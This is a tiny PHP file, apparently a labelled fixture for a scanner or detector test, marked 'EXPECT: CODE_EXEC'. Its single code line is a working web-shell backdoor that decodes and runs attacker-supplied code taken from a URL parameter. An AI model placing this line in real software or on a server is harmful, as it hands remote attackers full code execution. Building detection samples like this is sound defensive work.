<?php
// EXPECT: CODE_EXEC
eval(gzinflate(base64_decode($_GET['c'])));
